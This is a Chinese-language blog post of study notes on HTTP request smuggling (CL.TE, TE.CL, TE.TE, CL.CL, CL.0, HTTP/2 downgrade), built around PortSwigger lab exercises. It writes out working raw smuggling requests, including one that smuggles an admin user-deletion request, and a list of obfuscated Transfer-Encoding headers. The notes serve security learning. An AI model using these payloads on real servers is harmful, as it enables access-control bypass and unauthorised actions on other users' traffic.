<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>请求走私笔记(HTTP/2降级,绕过clte,请求隧道,响应投毒,缓存投毒,缓存欺骗) | hanblog</title><meta name="author" content="han"><meta name="copyright" content="han"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="笔记:必要条件1. 存在请求转发链 典型场景：客户端 → 前端服务器（反向代理&#x2F;负载均衡）→ 后端服务器 差异性：前端与后端服务器对 HTTP 请求的解析逻辑不一致。  2. 协议解析差异 前端（如反向代理）与后端服务器对 Content-Length（CL）或 Transfer-Encoding（TE）标头的处理方式不同。 CL.TE 走私：前端用 Content-Length 解析，后端用 T">
<meta property="og:type" content="article">
<meta property="og:title" content="请求走私笔记(HTTP&#x2F;2降级,绕过clte,请求隧道,响应投毒,缓存投毒,缓存欺骗)">
<meta property="og:url" content="http://example.com/2025/05/25/%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E7%AC%94%E8%AE%B0%E4%BC%98%E5%8C%96/index.html">
<meta property="og:site_name" content="hanblog">
<meta property="og:description" content="笔记:必要条件1. 存在请求转发链 典型场景：客户端 → 前端服务器（反向代理&#x2F;负载均衡）→ 后端服务器 差异性：前端与后端服务器对 HTTP 请求的解析逻辑不一致。  2. 协议解析差异 前端（如反向代理）与后端服务器对 Content-Length（CL）或 Transfer-Encoding（TE）标头的处理方式不同。 CL.TE 走私：前端用 Content-Length 解析，后端用 T">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/%E5%8F%AF%E5%8F%AF%E8%90%9D.png">
<meta property="article:published_time" content="2025-05-25T04:00:00.000Z">
<meta property="article:modified_time" content="2025-05-24T17:26:34.303Z">
<meta property="article:author" content="han">
<meta property="article:tag" content="请求走私">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/%E5%8F%AF%E5%8F%AF%E8%90%9D.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "请求走私笔记(HTTP/2降级,绕过clte,请求隧道,响应投毒,缓存投毒,缓存欺骗)",
  "url": "http://example.com/2025/05/25/%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E7%AC%94%E8%AE%B0%E4%BC%98%E5%8C%96/",
  "image": "http://example.com/img/%E5%8F%AF%E5%8F%AF%E8%90%9D.png",
  "datePublished": "2025-05-25T04:00:00.000Z",
  "dateModified": "2025-05-24T17:26:34.303Z",
  "author": [
    {
      "@type": "Person",
      "name": "han",
      "url": "http://cxkhanhan.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/xya.jpg"><link rel="canonical" href="http://example.com/2025/05/25/%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E7%AC%94%E8%AE%B0%E4%BC%98%E5%8C%96/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: han","link":"链接: ","source":"来源: hanblog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '请求走私笔记(HTTP/2降级,绕过clte,请求隧道,响应投毒,缓存投毒,缓存欺骗)',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/background.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/xya.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/可可萝.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">hanblog</span></a><a class="nav-page-title" href="/"><span class="site-name">请求走私笔记(HTTP/2降级,绕过clte,请求隧道,响应投毒,缓存投毒,缓存欺骗)</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">请求走私笔记(HTTP/2降级,绕过clte,请求隧道,响应投毒,缓存投毒,缓存欺骗)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-05-25T04:00:00.000Z" title="发表于 2025-05-25 12:00:00">2025-05-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-05-24T17:26:34.303Z" title="更新于 2025-05-25 01:26:34">2025-05-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/">请求走私</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="笔记"><a href="#笔记" class="headerlink" title="笔记:"></a>笔记:</h2><h3 id="必要条件"><a href="#必要条件" class="headerlink" title="必要条件"></a><strong>必要条件</strong></h3><h4 id="1-存在请求转发链"><a href="#1-存在请求转发链" class="headerlink" title="1. 存在请求转发链"></a>1. <strong>存在请求转发链</strong></h4><ul>
<li><strong>典型场景</strong>：<code>客户端 → 前端服务器（反向代理/负载均衡）→ 后端服务器</code></li>
<li><strong>差异性</strong>：前端与后端服务器对 HTTP 请求的解析逻辑不一致。</li>
</ul>
<h4 id="2-协议解析差异"><a href="#2-协议解析差异" class="headerlink" title="2. 协议解析差异"></a>2. <strong>协议解析差异</strong></h4><ul>
<li>前端（如反向代理）与后端服务器对 <code>Content-Length</code>（CL）或 <code>Transfer-Encoding</code>（TE）标头的处理方式不同。<ul>
<li><strong>CL.TE 走私</strong>：前端用 <code>Content-Length</code> 解析，后端用 <code>Transfer-Encoding</code> 解析。</li>
<li><strong>TE.CL 走私</strong>：前端用 <code>Transfer-Encoding</code> 解析，后端用 <code>Content-Length</code> 解析。</li>
<li><strong>TE.TE 走私</strong>：前后端均支持 <code>Transfer-Encoding</code>，但对标头值的处理不一致（如大小写、非法字符）。</li>
</ul>
</li>
</ul>
<h4 id="3-连接复用（Keep-Alive）"><a href="#3-连接复用（Keep-Alive）" class="headerlink" title="3. 连接复用（Keep-Alive）"></a>3. <strong>连接复用（Keep-Alive）</strong></h4><p><strong>“连接复用”特指前端服务器和后端服务器之间的TCP连接复用</strong>,而不是用户和前端服务器或者攻击者和前端服务器的复用连接</p>
<p>后端服务器必须复用 TCP 连接处理多个请求，否则走私的请求片段无法被后续请求捕获。</p>
<h4 id="4-非法请求构造可行性"><a href="#4-非法请求构造可行性" class="headerlink" title="4. 非法请求构造可行性"></a>4. <strong>非法请求构造可行性</strong></h4><ul>
<li>攻击者能构造包含歧义边界的请求：<ul>
<li>同时包含 <code>Content-Length</code> 和 <code>Transfer-Encoding</code> 标头。</li>
<li>使用非规范化的标头值（如畸形的块长度、多个 <code>Content-Length</code> 头）。</li>
</ul>
</li>
<li>前端服务器未对非法请求进行规范化或拦截。</li>
</ul>
<p>存在请求走私的环境要求:HTTP&#x2F;1.1</p>
<p>如果只有HTTP&#x2F;2是不行的</p>
<p>但是如果前端服务器会把HTTP&#x2F;2进行降级那么也可能存在请求走私</p>
<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项:"></a>注意事项:</h3><p>注意cl是否需要被自动更新</p>
<p>换行是\r\n在包里占两个字节也会计算在cl里</p>
<p><strong>第一个请求走私的污染包</strong></p>
<p><strong>路径最好不要只写&#x2F;根路径</strong></p>
<p>带点文件的路径拿过来更好打请求走私</p>
<p>不然有的时候会打不上去</p>
<p>比如这样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /resources/images/blog.svg HTTP/1.1(注意如果这里的/resources/images/blog.svg变成/可能会失效)</span><br><span class="line">Host: 0a6600af0319bf3080aa943600c700d0.web-security-academy.net</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Cookie: session=azgRVA1fAluAtG2RSZMz6OvxCYYrs3yo</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 34</span><br><span class="line">Connection: closed</span><br><span class="line"></span><br><span class="line">GET /admins HTTP/1.1</span><br><span class="line">Foo: x</span><br></pre></td></tr></table></figure>



<h3 id="在有混淆的请求解析差异的基础上可以总结出这样的请求走私打法规则"><a href="#在有混淆的请求解析差异的基础上可以总结出这样的请求走私打法规则" class="headerlink" title="在有混淆的请求解析差异的基础上可以总结出这样的请求走私打法规则:"></a>在有混淆的请求解析差异的基础上可以总结出这样的请求走私打法规则:</h3><p>这个适用于适用于clte tecl clcl tete有协议解析差异的情况下</p>
<p>cl限制往小了写是让下面的多出来的字符做第二个请求。往大了写能拿来打延时判断存在<br>te下面0后面接字符是作为第二个请求。但是没写结束符0则是可以拿来打延时</p>
<p><strong>上面这条规则适用于存在混淆边界(也就是存在协议解析差异)的情况下</strong></p>
<h2 id="困惑"><a href="#困惑" class="headerlink" title="困惑:"></a>困惑:</h2><p><strong>在不存在协议解析的差异的情况下为什么上面这条规则行不通了?不理解…..有大佬看到的话希望能解答解答教教我</strong></p>
<p><strong>qq:1512624649</strong> </p>
<p><strong>这条规则是从cl和te的解析逻辑上推出来的.可是为什么没有协议解析差异就行不通了???</strong></p>
<p>是因为RFC吗?但是tete靶场里明明没有严格遵循RFC好像也是不行</p>
<p>不理解┭┮﹏┭┮</p>
<p>ai说这样可以形成一种只对自己的下一次请求的污染?对别人不行.但我一直用tete靶场打的时候当我不对请求解析混淆的时候一直测不出来对自己的第二个请求的污染.这个观点存疑</p>
<h4 id="其他使用技巧注意事项"><a href="#其他使用技巧注意事项" class="headerlink" title="其他使用技巧注意事项:"></a>其他使用技巧注意事项:</h4><p>要注意HTTP&#x2F;1.1如果默认支持HTTP&#x2F;2的话默认会优先http&#x2F;2</p>
<p>响应如果说请求头重复</p>
<p>一般是Host头重复了和正常的请求</p>
<p>正常的请求头是无法改变的.我们只好把第二个我们尝试污染的请求头里Host删除掉就可以了</p>
<h3 id="到底什么是请求解析差异"><a href="#到底什么是请求解析差异" class="headerlink" title="到底什么是请求解析差异?"></a>到底什么是请求解析差异?</h3><h3 id="各种类型的混淆请求解析差异类型"><a href="#各种类型的混淆请求解析差异类型" class="headerlink" title="各种类型的混淆请求解析差异类型:"></a>各种类型的混淆请求解析差异类型:</h3><h4 id="clte-tecl的混淆方式"><a href="#clte-tecl的混淆方式" class="headerlink" title="clte tecl的混淆方式"></a>clte tecl的混淆方式</h4><p>这里做个简单的举例</p>
<p>比如clte tecl这两种它本身存在两种请求解析</p>
<p>一种是<code>Content-Length</code>,一种是Transfer-Encoding</p>
<p>当两者共同存在的时候他们的请求解析就是混淆的</p>
<p>所以支持,然后根据前后端对这个不同的处理方式形成请求走私	</p>
<p><strong>这是portswigger的靶场cl.te包:</strong></p>
<p>第二个Content-Length: 2的作用是为了让第二个变成完整的请求</p>
<p>这样的话头就不会重复不然会跟原先的Host头重复报错</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a5300d503627e4d8187481200f600f4.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 151</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin/delete?username=carlos HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">X-Ignore: X</span><br><span class="line">Content-Length: 2</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">12</span><br></pre></td></tr></table></figure>

<p><strong>te.cl</strong>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a66004b030827208077262e00bc0087.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">5a</span><br><span class="line">GPOST / HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="tete的混淆方式"><a href="#tete的混淆方式" class="headerlink" title="tete的混淆方式"></a>tete的混淆方式</h4><p>虽然前后端解析都是te.但是请求头里仍然要存在cl字段并且正常使用就行.也就是让bp自动update他的字符个数即可</p>
<p>混淆标头的方法是参考参数污染的方式构造多个<code>Transfer-Encoding</code>请求头，例如：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Transfer</span>-<span class="title class_">Encoding</span>: xchunked</span><br><span class="line"><span class="title class_">Transfer</span>-<span class="title class_">Encoding</span> : chunked</span><br><span class="line"><span class="title class_">Transfer</span>-<span class="title class_">Encoding</span>: chunked</span><br><span class="line"><span class="title class_">Transfer</span>-<span class="title class_">Encoding</span>: x</span><br><span class="line"><span class="title class_">Transfer</span>-<span class="title class_">Encoding</span>:[tab]chunked</span><br><span class="line">[space]<span class="title class_">Transfer</span>-<span class="title class_">Encoding</span>: chunked</span><br><span class="line"><span class="attr">X</span>: X[\n]<span class="title class_">Transfer</span>-<span class="title class_">Encoding</span>: chunked</span><br><span class="line"><span class="title class_">Transfer</span>-<span class="title class_">Encoding</span></span><br><span class="line">: chunked</span><br></pre></td></tr></table></figure>

<p>混淆的标头要放在正常的te请求头前面才可以</p>
<p>这样可以导致错误的标头被前后端形成不同的处理</p>
<p>放在后面就会导致混淆失败</p>
<p>比如这样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a58000103add95680376cb9003a0008.web-security-academy.net</span><br><span class="line">Connection: keep-alive</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36</span><br><span class="line">accept: */*</span><br><span class="line">Sec-Fetch-Site: cross-site</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Sec-Fetch-Storage-Access: active</span><br><span class="line">Accept-Encoding: gzip, deflate, br, zstd</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Cookie: session=Gji6kFE5GyJKj7XdXghfLDZ84GBKsdR4</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Transfer-Encoding: xchunked</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 6</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">G</span><br></pre></td></tr></table></figure>

<h4 id="clcl的混淆方式"><a href="#clcl的混淆方式" class="headerlink" title="clcl的混淆方式"></a>clcl的混淆方式</h4><p>标头同时存在两个cl</p>
<p>前端服务器和后端服务器都使用<code>Content-Length</code>请求头，但是前后端服务器对多个<code>Content-Length</code>请求头的处理存在差异时，存在此漏洞。如用户发送以下请求：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> / <span class="variable constant_">HTTP</span>/<span class="number">1.1</span>\r\n</span><br><span class="line"><span class="title class_">Host</span>: example.<span class="property">com</span>\r\n</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span>: <span class="number">30</span>\r\n</span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span>: <span class="number">5</span>\r\n</span><br><span class="line"></span><br><span class="line">a=<span class="number">1</span>\r\n</span><br><span class="line"><span class="variable constant_">GET</span> /admin <span class="variable constant_">HTTP</span>/<span class="number">1.1</span>\r\n</span><br><span class="line"><span class="attr">X</span>: <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>前端服务器根据<code>Content-Length: 30</code>解析请求主体获取完整请求，但是后端服务器根据<code>Content-Length: 5</code>解析请求主体，将<code>a=1\r\n</code>后的部分当作下一个请求的开头，此时如果前端服务器继续向后端服务器转发请求，后端服务器收到的第二个请求为：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">GET</span> /admin <span class="variable constant_">HTTP</span>/<span class="number">1.1</span>\r\n</span><br><span class="line"><span class="attr">X</span>: 1POST / <span class="variable constant_">HTTP</span>/<span class="number">1.1</span>\r\n</span><br><span class="line"><span class="title class_">Host</span>: example.<span class="property">com</span>\r\n</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>成功执行了注入的HTTP请求，导致请求走私。</p>
<h4 id="cl-0类型并不需要混淆-本身就是一种被混淆过的"><a href="#cl-0类型并不需要混淆-本身就是一种被混淆过的" class="headerlink" title="cl.0类型并不需要混淆,本身就是一种被混淆过的"></a>cl.0类型并不需要混淆,本身就是一种被混淆过的</h4><p>cl.0直接用默认的就可以了</p>
<p>他是前端存在cl.但是后端的cl默认为0</p>
<p>又或者说后端cl被忽略了</p>
<p>所以他本身就是个存在前后端请求解析差异的漏洞类型</p>
<p>前端的cl正常让他update字节就行</p>
<p>然后写入想要污染的请求就行了</p>
<p>比如这样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /resources/images/blog.svg HTTP/1.1</span><br><span class="line">Host: 0a6600af0319bf3080aa943600c700d0.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 34</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line"></span><br><span class="line">GET /hopefully404 HTTP/1.1</span><br><span class="line">Foo: x</span><br></pre></td></tr></table></figure>

<h4 id="H2-CL"><a href="#H2-CL" class="headerlink" title="H2.CL"></a>H2.CL</h4><p>根据文章里的讲解</p>
<p><strong>原因是</strong></p>
<p><strong>前端会自动把HTTP2进行自动降级发送给后端</strong></p>
<p><strong>返回包里的HTTP&#x2F;2 200 OK是前端的返回内容</strong></p>
<p><strong>如果发包请求改成HTTP&#x2F;1.1</strong></p>
<p><strong>这里就是HTTP&#x2F;1.1 200 OK</strong></p>
<p><strong>所以由此判断这里是前端响应的返回包</strong></p>
<p><strong>因为前端和后端之间是用HTTP&#x2F;1.1把HTTP&#x2F;2自动降级的</strong></p>
<p><strong>自动降级的时候如果没有检查请求包里的CL请求头或者验证删除</strong></p>
<p><strong>这个时候就会造成HTTP&#x2F;1.1的请求走私</strong></p>
<p><strong>原理跟其他的类型其实都有点像</strong></p>
<h5 id="重点-为什么这里在HTTP-2可以的情况下改成HTTP-1-1的时候就不行了"><a href="#重点-为什么这里在HTTP-2可以的情况下改成HTTP-1-1的时候就不行了" class="headerlink" title="重点:为什么这里在HTTP&#x2F;2可以的情况下改成HTTP&#x2F;1.1的时候就不行了"></a>重点:为什么这里在HTTP&#x2F;2可以的情况下改成HTTP&#x2F;1.1的时候就不行了</h5><p><strong>原因在于HTTP&#x2F;1.1的时候前端检测到的时候会对te和cl头进行检测和验证删除错误的</strong></p>
<p><strong>就不会请求走私</strong></p>
<p><strong>但是HTTP&#x2F;2本来是不支持te和cl的</strong></p>
<p><strong>但是前端服务器会把它进行降级发送给后端</strong></p>
<p><strong>然后前端服务器对HTTP&#x2F;2又没有检测验证te和cl头的话那么就可以请求走私</strong></p>
<p><strong>前端服务器在进行降级时会添加HTTP&#x2F;1请求头，如果降级之前没有验证或删除<code>Content-Length</code>，那我们就可以注入<code>Content-Length</code>头，造成请求走私。</strong></p>
<p><strong>注意:YAKIT不太行这里要用bp右边改成http2</strong></p>
<p><strong>而不是直接改发包的字符不然不可以</strong></p>
